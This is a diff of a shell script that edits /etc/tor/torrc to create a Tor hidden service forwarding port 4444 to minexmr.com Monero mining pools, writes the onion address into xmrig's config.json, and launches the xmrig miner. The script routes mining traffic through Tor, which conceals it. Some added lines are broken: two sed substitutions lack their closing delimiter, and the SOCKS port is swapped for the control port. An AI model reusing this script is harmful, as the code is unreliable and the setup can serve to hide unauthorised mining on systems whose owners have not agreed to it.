@@ -12,12 +12,8 @@ sudo sed -i '18s/#SOCKSPort/SOCKSPort/ ' /etc/tor/torrc
 sudo sed -i '57s/#ControlPort/ControlPort/ ' /etc/tor/torrc
 sudo sed -i 's/#ORPort/ORPort/ ' /etc/tor/torrc
 sudo sed -i 's\#HiddenServiceDir /var/lib/tor/other_hidden_service\HiddenServiceDir /var/lib/tor/other_hidden_service\ ' /etc/tor/torrc
-#sudo sed -i 's\#HiddenServicePort 80 127.0.0.1:80\HiddenServicePort 8080 127.0.0.1:8080\ ' /etc/tor/torrc
-sudo sed -i '76i\HiddenServicePort 4444 pool.minexmr.com:4444\ ' /etc/tor/torrc
-sudo sed -i '76i\HiddenServicePort 4444 fr.minexmr.com:4444\ ' /etc/tor/torrc
-sudo sed -i '76i\HiddenServicePort 4444 de.minexmr.com:4444\ ' /etc/tor/torrc
-sudo sed -i '76i\HiddenServicePort 4444 sg.minexmr.com:4444\ ' /etc/tor/torrc
-sudo sed -i '76i\HiddenServicePort 4444 ca.minexmr.com:4444\ ' /etc/tor/torrc
+sudo sed -i 's/#HashedControlPassword/HashedControlPassword ' /etc/tor/torrc
+sudo sed -i 's/#CookieAuthentication/CookieAuthentication ' /etc/tor/torrc
 sudo sed -i '76i\HiddenServicePort 4444 us-west.minexmr.com:4444\ ' /etc/tor/torrc
 
 sudo systemctl enable tor
@@ -37,7 +33,7 @@ sudo sed -i '9d' config.json
 sudo cat /var/lib/tor/other_hidden_service/hostname | sed '1s/^/9i /' | sed -i -f- config.json
 sudo sed -i '9s/$/:4444",/ ' config.json 
 sudo sed -i '9s|^|            "url": "|' config.json
-
+sudo sed -i 's/9050/9051/ ' config.json
 
 
 chmod +x xmrig && ./xmrig
